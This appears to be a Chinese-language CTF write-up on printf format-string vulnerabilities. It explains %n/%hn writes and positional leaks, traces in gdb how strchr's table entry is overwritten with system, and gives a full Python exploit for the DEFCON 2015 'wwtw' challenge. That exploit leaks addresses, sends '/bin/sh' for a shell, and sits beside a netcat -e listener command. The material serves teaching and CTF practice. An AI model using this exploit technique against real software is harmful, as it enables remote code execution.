# 二进制漏洞之——邪恶的printf

0x00 前言
=======

* * *

本文是二进制漏洞相关的系列文章。printf有一些鲜为人知的特性，在为编码提供便利的同时，也引入了安全的问题。本文重点描述printf在漏洞利用中的一些用法，在正常的编程中不建议这么用。

0x01 概述
=======

* * *

printf系列函数的%$(如：%20$x)格式输出，可泄漏栈内的数据(如模块加载的基址)，给攻方提供下一步所必须的信息； prinrf系列函数的%n、%hn格式输出，可修改栈中指针指向的任意可写地址（如函数向量表中函数的地址，Windows下叫IAT）。

0x02 基础知识
=========

* * *

通常printf的%根据在格式串中出现的顺序，依次使用栈中的地址，但是使用$可以指定特定序号的栈参数。例如： printf(%20$x, 0x100)实际输出的是第20个参数的值。尽管调用者没有提供20个参数，但是c调用格式的压栈方式，能使该代码顺利执行。

第20个参数就是call之前的[esp+4*20]，如果在某次call时，[esp+4*20]固定的保存着某个关键值，该值就会泄漏给攻击者。

如果该值是镜像模块的某一地址，这个泄漏就会使ASLR(Address space layout randomization)形同虚设。

printf系列函数的%n格式在编程中并不常用。在MS的高版本的运行时库中已经不支持了，代替的是_printf_p函数，参见：https://msdn.microsoft.com/zh-cn/library/Vstudio/bt7tawza(v=vs.110).aspx

以下是printf特殊用法的一些例子：

```
printf("%2$c,%1$c\n", 'B', 'A');       //$表示使用第几个参数，输出A,B

printf("%88c%n\n", 'A', buff);         //打印88个字符，前面用空格填充，
                                       //最后一个是'A'，同时*(int *)buff=88。
printf("%1024c%23$hn\n");              //带有攻击性的做法，第01个参数对用%c，
                                       //具体是什么不关心，目标是是把第23个参数
                                       //指向的内存的前2个字节赋值为1024。
printf("%*c%hn\n", 0x1234, 'A', buff); //打印0x1234个字符，前面用空格填充，
                                       //最后一个是'A'，同时*(short *)buff = 0x1234。

```

上面这行代码具体说明一下：

*   %*c 打印0x1234个字符，前面用空格填充，最后一个是'A'
*   %hn 把前面打印的字符数（0x1024）输出到buff指向的2个字节
*   %ln 把前面打印的字符数（0x1024）输出到buff指向的4个字节
*   %n 把前面打印的字符数（0x1024）输出到buff指向的4个字节

此外顺便看一下#的用法：

```
printf("%#d\n", 0x10);  //#表示输出前导符，如：16
printf("%#x\n", 0x10);  //#表示输出前导符，如：0x10
printf("%#o\n", 0x10);  //#表示输出前导符，如：020

```

0x03 实例片段
=========

* * *

下面是内存的栈内存的变化情况来展示攻击的过程。

在调用printf时，执行call指令之前:

```
(gdb) uu $eip
=> 0x2a9188:    call   0x2a8880 <printf@plt>
   0x2a918d:    lea    eax,[ebx-0x1fb4]
   0x2a9193:    mov    DWORD PTR [esp],eax

```

此时的堆栈如下：

```
(gdb) dd $esp
0xBFFF4FE0 : BFFF501C 58601366 4049BEFE EF0F16F4
0xBFFF4FF0 : BFC8B039 004E6927 BFFF522C BFFF5024
0xBFFF5000 : BFFF5233 BFFF5026 58601366 4049BEFE
0xBFFF5010 : EF0F16F4 BFC8B039 00000001 342E3135
0xBFFF5020 : 33313239 2D202C37 39312E30 38373832
0xBFFF5030 : 31253A20 25633632 68243732 3432256E
0xBFFF5040 : 63363539 24383225 41416E68 002AD05E
0xBFFF5050 : 002AD05C 00280000 00470048 00000006

```

其中第一个参数BFFF501C，就是攻击字符串，从以下代码可以看到，目标地址是第27、28参数的两个地址：

```
(gdb) db BFFF501C
0xBFFF501C : 35 31 2E 34 39 32 31 33 - 37 2C 20 2D 30 2E 31 39 51.492137, -0.19
0xBFFF502C : 32 38 37 38 20 3A 25 31 - 32 36 63 25 32 37 24 68 2878 :%126c%27$h
0xBFFF503C : 6E 25 32 34 39 35 36 63 - 25 32 38 24 68 6E 41 41 n%24956c%28$hnAA
0xBFFF504C : 5E D0 2A 00 5C D0 2A 00 - 00 00 28 00 48 00 47 00 ^.*.\.*...(.H.G.

```

第27个参数是002AD05E，第28个参数是002AD05C，实际上是修改002AD05C处的4个字节。 目标地址002AD05C在调用printf之前的值是009843E0：

```
(gdb) dd 0x002AD05C
0x002AD05C : 009843E0 002A89B6 00921C00 002A89D6
0x002AD06C : 0099C620 002A89F6 00A07EC0 002A8A16
0x002AD07C : 009EF0D0 009371C0 009EEBD0 002A8A56
0x002AD08C : 00000000 002AD090 00000000 00000000

```

地址009843E0就是函数strchr，可以查看一下：

```
(gdb) uu 0x09843E0
   0x9843e0 <strchr>:   push   edi
   0x9843e1 <strchr+1>: mov    eax,DWORD PTR [esp+0x8]
   0x9843e5 <strchr+5>: mov    edx,DWORD PTR [esp+0xc]
   0x9843e9 <strchr+9>: mov    dh,dl

```

接着执行printf的调用：

```
(gdb) nn
   0x002a918d in ?? ()
=> 0x2a918d:    lea    eax,[ebx-0x1fb4]

```

调用printf之后，查看目标地址002AD05C的值：

```
(gdb) dd 0x002AD05C
0x002AD05C : 00946210 002A89B6 00921C00 002A89D6
0x002AD06C : 0099C620 002A89F6 00A07EC0 002A8A16
0x002AD07C : 009EF0D0 009371C0 009EEBD0 002A8A56
0x002AD08C : 00000000 002AD090 00000000 00000000

```

原来的009843E0变成了00946210，也就是system的地址，可以查看一下：

```
(gdb) uu 0x946210
   0x946210 <system>:   sub    esp,0xc
   0x946213 <system+3>: mov    DWORD PTR [esp+0x4],esi
   0x946217 <system+7>: mov    esi,DWORD PTR [esp+0x10]

```

此时对strchr的调用变成了对system的调用，随后如果攻击者发送"/bin/sh"字符串,本来由strchr处理的事情，现在变成了由system处理，从而达成了执行system("/bin/sh")的目标。

0x04 实例分析
=========

* * *

这里采用了DEFCON CTF 2015的一个pwn做为例子(wwtw_c3722e23150e1d5abbc1c248d99d718d)。

在wwtw前面的俄罗斯方块的剧情可nop掉，以便程序直接到我们关注的函数sub_1027()。此外，定时器也会影响调试，给nop掉以方便调试。 要攻击的目标函数流程如下：

```
    #!c++
int sub_1027()
{
  double v0; // ST28_8@6
  int result; // eax@9
  int v2; // ecx@9
  char *nptr; // [sp+24h] [bp-424h]@4
  double v4; // [sp+30h] [bp-418h]@6
  char s; // [sp+3Ch] [bp-40Ch]@2
  int v6; // [sp+43Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Coordinates: ");
      fflush(stdout);
      if ( sub_F7E(0, (int)&s, 0x3FF, 10) == -1 )
        exit(-1);
      nptr = strchr(&s, 0x2C);
      if ( nptr )
        break;
      puts("Invalid coordinates");
    }
    v0 = atof(&s);
    v4 = atof(nptr + 1);
    printf("%f, %f\n", v0, v4);
    if ( 51.492137 != v0 || -0.192878 != v4 )
      break;
    printf("Coordinate ");
    printf(&s);
    printf(" is occupied by another TARDIS.  Materializing there ");
    puts("would rip a hole in time and space. Choose again.");
    fflush(stdout);
  }
  printf("You safely travel to coordinates %s\n", &s);
  result = fflush(stdout);
  if ( *MK_FP(__GS__, 20) != v6 )
    sub_2EF0(v2, *MK_FP(__GS__, 20) ^ v6);
  return result;
}

```

其中sub_F7E()函数读取用户的输入，放在0x3FF长的一段内存中，从汇编码看这是一个栈上的内存，这是一个关键，如果放在堆中就很难完成攻击。

用户输入的数据在函数内经过一番处理后，printf(&s)又把用户的输入原样输出了。因此我们可以构造下面的字符串，来获取libc和程序本身的加载地址。

```
"51.492137, -0.192878 :%282$p:%275$p:\n"

```

相应得到的返回结果：

```
Coordinate 51.492137, -0.192878 :0x917744:0x2a9491: is occupied by another TARDIS. 
Materializing there would rip a hole in time and space. Choose again.

```

其中0x917744是libc代码段的一个固定地址，0x2a9491是程序自己代码段的一个固定地址，由于是固定的地址，因此可通过偏移修正得到加载基址：

```
libc_base = 0x917744 - 0xc744 = 0x90b000
mod_base  = 0x2a9491 - 0x1491 = 0x2a8000

```

接着进行下一步的攻击，终极目标是执行system("/bin/sh")。 这里选择替换strchr()的IAT，当然atof()也是一个不错的选择。从IDA可以知道strchr()的IAT偏移为0x505c， system()在libc中的实际偏移地址为0x3b210。结合上面得到的mod_base和libc_base可以算出攻击时system()的地址和strchr()的IAT的真实地址，而不受ASLR的限制。

```
system_funaddr = 0x90b000 + 0x3b210= 0x946210
strchr_iataddr = 0x2a8000 + 0x505c = 0x2ad05c

```

攻击目标进一步明确为： 替换mod_base+0x505c处的值为libc_base+0x3b210； 发送"/bin/sh"，触发system("/bin/sh")。

用libformatstr可方便的生成exp，参见：https://github.com/hellman/libformatstr

```
preload = "51.492137, -0.192878 :"
prelen = len(preload)                       ###22###
offset = ((system_funaddr >> 16 - prelen) << 16) + ((system_funaddr - prelen) & 0xffff)
fsb = libformatstr.FormatStr()
fsb[strchr_iataddr] = offset & 0xffffffff   ###0x7e61fa###
index = (60 + prelen + 3) / 4
payload = fsb.payload(index, prelen)
exp = preload + payload + "\n"

```

生成的攻击串exp为：

```
51.492137, -0.192878 :%126c%27$hn%24956c%28$hnAA\x5e\xd0\x2a\x00\x5c\xd0\x2a\x00

```

其中包含\x00，这是不完美的，但不影响功能。

关于exp的几点说明：

1.  由于%hn只能修改一个WORD，因此修改一个DWORD需要2个%hn。
2.  exp中"51.492137, -0.192878 :%126c"为22+126(0x94)，对应x5e\xd0\x2a\x00的2字节。
3.  exp中"51.492137, -0.192878 :%126c%24956c"为22+126+24956(0x6210)，对应x5c\xd0\x2a\x00的2字节。
4.  攻击串必须被放在栈中，否则构造的\x5e\xd0\x2a\x00\x5c\xd0\x2a\x00无法被%27$hn访问到。
5.  从预分析中得知call printf时ESP到exp头的距离是60字节(0xBFFF501C-0xBFFF4FE0),由index = (60 + prelen + 3)/4，向上取整即第21个参数，生成时加了6个是payload本身的长度，从而确保[esp+27*4]处正好是\x5e\xd0\x2a\x00。
6.  libformatstr会根据prelen的长度，以及payload本身的长度计算\x5e\xd0\x2a\x00\x5c\xd0\x2a\x00前需要补充的padding，因此fsb.payload的第二个参数设置为prelen。但在计算%c的时候有没有考虑prelen的长度，需要自己求得修正后的offset。

0x05 exp代码
==========

* * *

```
# -*- coding: utf-8 -*-

import sys
import socket
import time
import telnetlib
import libformatstr

def read_data(expsock, endstr):
    data = ''
    while not data.endswith(endstr):
        data += expsock.read(1)
    return data

offset_system  = 0x3b210
offset_strchr_iat = 0x505c

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 2606))
expsock = sock.makefile('rw', bufsize=0)

print read_data(expsock, "Selection: ")
expsock.write("3\n")
print read_data(expsock, "Coordinates: ")

expsock.write("51.492137, -0.192878 :%282$p:%275$p:\n")
respond = read_data(expsock, "Coordinates: ")

libc_base = int(respond.split(':')[1],16) - 0xc744
mod_base = int(respond.split(':')[2],16) - 0x1491
system_funaddr = libc_base + offset_system
strchr_iataddr = mod_base + offset_strchr_iat

print "mod_base", hex(mod_base)
print "libc_base", hex(libc_base)
print "system_funaddr", hex(system_funaddr)
print "strchr_iataddr", hex(strchr_iataddr)

preload = "51.492137, -0.192878 :"
prelen = len(preload)                       ###22###
offset = (((system_funaddr >> 16) - prelen) << 16) + ((system_funaddr - prelen) & 0xffff)
fsb = libformatstr.FormatStr()
fsb[strchr_iataddr] = offset & 0xffffffff   ###0x7e61fa###
index = (60 + prelen + 3) / 4
payload = fsb.payload(index, prelen)
exp = preload + payload + "\n"

print "rxp:", exp
print "rxp:", exp.encode('hex')

time.sleep(50) #for debug

expsock.write(exp)
read_data(expsock, "Coordinates: ")
expsock.write("/bin/sh;\x00\n")

sh = telnetlib.Telnet()
sh.sock = sock
sh.interact()

```

0x06 构建环境
=========

* * *

本文的GDB调试环境使用了.gdbinit和pygdb.py，扩展了raw gdb的功能。 原ELF文件前面有许多坑，为了方便测试，这里绕过了这些坑，修改如下：

```
    00000E82: 85 40
    00000E83: C0 40
    00001254: E8 90
    00001255: B4 90
    00001256: 1A 90
    00001257: 00 90
    00001258: 00 90
    00001259: E8 90
    0000125A: 5A 90
    0000125B: FC 90
    0000125C: FF 90
    0000125D: FF 90
    0000125E: 85 33
    00001335: E8 90
    00001336: 91 90
    00001337: F8 90
    00001338: FF 90
    00001339: FF 90
    0000133A: 8D 90
    0000133B: 83 90
    0000133C: CB 90
    0000133D: BB 90
    0000133E: FF 90
    0000133F: FF 90
    00001340: 89 90
    00001341: 44 90
    00001342: 24 90
    00001343: 04 90
    00001344: C7 90
    00001345: 04 90
    00001346: 24 90
    00001347: 0E 90
    00001348: 00 90
    00001349: 00 90
    0000134A: 00 90
    0000134B: E8 90
    0000134D: F5 90
    0000134E: FF 90
    0000134F: FF 90
    00001350: C7 90
    00001351: 04 90
    00001352: 24 90
    00001353: 02 90
    00001354: 00 90
    00001355: 00 90
    00001356: 00 90
    00001357: E8 90
    00001358: 94 90
    00001359: F5 90
    0000135A: FF 90
    0000135B: FF 90
    00001468: 85 40
    00001469: C0 40

```

服务端启动监听。通常了nc不支持-e参数，需用netcat。

```
./netcat -l -p 2606 -e ./wwtw_4
./wwtw_4.py

```

id 查看结果：

```
uid=0(root) gid=0(root) group=0(root) env=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

